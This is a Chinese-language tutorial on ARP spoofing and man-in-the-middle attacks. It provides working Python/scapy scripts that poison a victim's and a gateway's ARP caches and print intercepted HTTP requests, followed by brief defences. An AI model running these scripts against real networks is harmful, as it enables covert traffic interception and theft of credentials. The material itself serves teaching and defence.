ARP 欺騙與中間人攻擊（MITM）是網路安全中常見的攻擊技術。這些攻擊可以讓攻擊者攔截、篡改甚至竊取在網絡中傳遞的數據。以下是這兩種攻擊的基本概念和如何使用 Python 來實現簡單的模擬攻擊。

### 1. **ARP 欺騙（ARP Spoofing）**
ARP 欺騙（或稱為 ARP 中毒）是利用局域網中的 ARP（地址解析協議）漏洞，攻擊者偽造 ARP 封包，將自己的 MAC 地址與目標設備的 IP 地址進行綁定，從而攔截或篡改流經網路的數據。

#### 1.1 **ARP 欺騙的 Python 實現**
在這個範例中，我們會模擬一個簡單的 ARP 欺騙攻擊，將受害者的 IP 地址綁定到攻擊者的 MAC 地址上。

```python
import scapy.all as scapy

# 发送ARP包
def spoof(target_ip, spoof_ip):
    # 生成ARP响应包，目标IP替换成受害者，源IP替换成攻击者的IP
    arp_response = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    scapy.send(arp_response, verbose=False)
    print(f"Sending spoofed ARP to {target_ip} [spoofed IP: {spoof_ip}]")

# 受害者和網關的 IP 地址
target_ip = "192.168.1.5"  # 假設目標IP
gateway_ip = "192.168.1.1"  # 假設網關IP

# 持續發送 ARP 欺騙封包
while True:
    spoof(target_ip, gateway_ip)
    spoof(gateway_ip, target_ip)
```

在這個範例中，`scapy` 库用于发送 ARP 响应包。攻击者发送伪造的 ARP 包，将受害者的 IP 地址与攻击者的 MAC 地址绑定，使得网络流量流向攻击者设备。`target_ip` 是目标设备的 IP 地址，`gateway_ip` 是网关的 IP 地址。

### 2. **中間人攻擊（MITM）**
中間人攻擊（MITM）是指攻擊者在通信的兩個主體之間插入自己，從而能夠攔截、篡改或轉發通信內容。在 ARP 欺騙的基礎上，攻擊者可以進行 MITM 攻擊，攔截來自受害者到網關的通信流量，進行監聽、篡改或插入數據。

#### 2.1 **ARP 欺騙與 MITM 攻擊結合**

攻擊者可以利用 ARP 欺騙來將網路流量引導到自己身上，這樣他就可以攔截受害者的所有網絡請求和響應。以下是如何結合 ARP 欺騙和 MITM 攻擊來實現對 HTTP 通信的攔截和篡改。

```python
import scapy.all as scapy
from scapy.layers.l2 import ARP
from scapy.sendrecv import send, sniff

# ARP 欺騙
def spoof(target_ip, spoof_ip):
    arp_response = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(arp_response, verbose=False)

# 攔截 HTTP 請求並篡改
def http_sniff(packet):
    if packet.haslayer(scapy.IP) and packet.haslayer(scapy.TCP):
        ip_src = packet[scapy.IP].src
        ip_dst = packet[scapy.IP].dst
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            if b"GET" in load or b"POST" in load:
                print(f"HTTP Request from {ip_src} to {ip_dst}: {load}")

# 受害者與網關的 IP 地址
target_ip = "192.168.1.5"  # 目標IP
gateway_ip = "192.168.1.1"  # 網關IP

# 開始ARP欺騙，並攔截HTTP流量
while True:
    spoof(target_ip, gateway_ip)  # 讓目標向攻擊者發送流量
    spoof(gateway_ip, target_ip)  # 讓網關向攻擊者發送流量
    sniff(filter="ip", prn=http_sniff, store=0, timeout=10)
```

在這個範例中，攻擊者不僅會發送 ARP 欺騙包，還會通過 `sniff` 函數攔截流經網絡的 HTTP 請求，並打印出來。這個腳本會不斷地向目標和網關發送 ARP 欺騙包，從而確保流量經過攻擊者，並對 HTTP 請求進行捕獲。

### 3. **防禦與緩解措施**
對於 ARP 欺騙和中間人攻擊，以下是一些防禦措施：
- **使用靜態 ARP 表**：手動設置 ARP 表，防止ARP欺騙。
- **ARP 欺騙檢測工具**：使用工具如 `arpwatch` 或其他 ARP 檢測工具來檢測是否有異常的 ARP 包。
- **加密通信**：使用 HTTPS 等加密協議來保護數據，防止被攔截或篡改。
- **VPN（虛擬專用網絡）**：在公共網絡中使用 VPN 可以有效隔離攻擊者。

### 結論

在這一節中，我們介紹了如何使用 Python 模擬 ARP 欺騙與 MITM 攻擊。這些攻擊技術通常用來竊取敏感數據（如帳戶登錄信息、未加密的 HTTP 請求等），並且攻擊者可以利用這些技術來操縱網絡通信。防範這些攻擊的最佳方式是使用強加密協議（如 HTTPS、VPN）並監控網絡中的 ARP 異常。